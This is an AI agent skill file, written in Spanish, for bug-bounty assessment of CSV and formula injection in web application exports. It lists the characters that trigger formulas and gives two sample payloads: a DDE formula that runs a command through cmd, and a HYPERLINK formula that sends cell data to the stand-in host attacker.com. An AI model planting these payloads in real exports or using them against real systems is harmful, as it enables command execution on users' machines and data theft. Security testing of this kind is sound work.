---
name: bug-bounty-csv-injection
description: Detección y mitigación de vulnerabilidades CSV Injection / Formula Injection. Ejecución de comandos via fórmulas (=, +, -, @), DDE en Microsoft Excel y LibreOffice.
---

# Skill: CSV & Formula Injection Assessment

Esta habilidad capacita al agente para evaluar aplicaciones web que permiten exportar datos generados por usuarios (nombres, comentarios, correos) a archivos `.csv` o `.xlsx` sin neutralizar fórmulas ejecutables por aplicaciones de hojas de cálculo.

## 📌 Diagnóstico y Exposición de Fórmulas

### 1. Caracteres Desencadenantes
Cualquier celda de texto que comience con uno de los siguientes caracteres será interpretada como fórmula activa por Excel o LibreOffice:
`=`, `+`, `-`, `@`, `%`

### 2. Formatos de Fórmulas Inseguras
- **Inyección de Comandos DDE (Microsoft Excel)**:
  `=cmd|' /C calc'!A0`
- **Exfiltración de Datos mediante Hyperlinks**:
  `=HYPERLINK("http://attacker.com/log?data="&A2, "Click to Details")`

---

## 📚 Referencias Técnicas

Consulta los detalles y remediación en:
[formula-injection.md](file:///C:/Users/logir/.gemini/antigravity-ide/scratch/bug-bounty-skills/skills/bug-bounty-csv-injection/references/formula-injection.md)
